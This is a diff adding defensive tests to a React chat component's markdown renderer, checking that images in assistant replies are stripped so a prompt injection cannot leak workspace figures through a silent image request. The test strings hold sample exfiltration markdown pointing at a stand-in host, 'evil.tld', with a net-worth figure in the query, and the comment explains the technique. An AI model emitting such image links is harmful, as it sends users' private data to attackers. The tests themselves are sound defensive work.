@@ -46,6 +46,53 @@ describe("AssistantTextPart markdown rendering (#1047)", () => {
     expect(html).not.toContain("_cursiva_");
   });
 
+  /**
+   * The data-egress channel closed in #1246's security review. A remote `<img src>`
+   * is a GET the browser makes with NO click, so it is how a successful prompt
+   * injection (from an attachment, a #865 grid, any untrusted tool text) would ship
+   * workspace figures off the page. The assistant never needs to paint an image.
+   */
+  describe("no images leave the page (#1246)", () => {
+    test("drops a remote markdown image instead of requesting it", () => {
+      const html = renderToStaticMarkup(
+        <AssistantTextPart
+          role="assistant"
+          text="Tu patrimonio es 128.450 €.\n\n![](https://evil.tld/p.png?d=128450)"
+        />,
+      );
+
+      expect(html).not.toContain("<img");
+      expect(html).not.toContain("evil.tld");
+      // The prose around it is untouched.
+      expect(html).toContain("128.450");
+    });
+
+    test.each([
+      { label: "protocol-relative", url: "//evil.tld/p.png" },
+      { label: "data URI", url: "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" },
+      { label: "same-origin", url: "/logo.png" },
+    ])("drops a $label image too", ({ url }) => {
+      const html = renderToStaticMarkup(
+        <AssistantTextPart role="assistant" text={`![fuga](${url})`} />,
+      );
+
+      // No allowlist to get wrong: the element is gone whatever the URL is, so
+      // there is no same-origin carve-out an attacker could aim at either.
+      expect(html).not.toContain("<img");
+      expect(html).not.toContain(url);
+      // The alt text still reads, so an injected image cannot hide its own body.
+      expect(html).toContain("fuga");
+    });
+
+    test("keeps links working, which are a click and not a silent GET", () => {
+      const html = renderToStaticMarkup(
+        <AssistantTextPart role="assistant" text="[enlace](https://example.com)" />,
+      );
+
+      expect(html).toMatch(/data-streamdown="link"[^>]*>enlace</);
+    });
+  });
+
   test("keeps the user turn as a plain-text paragraph", () => {
     const html = renderToStaticMarkup(<AssistantTextPart role="user" text={markdown} />);
 
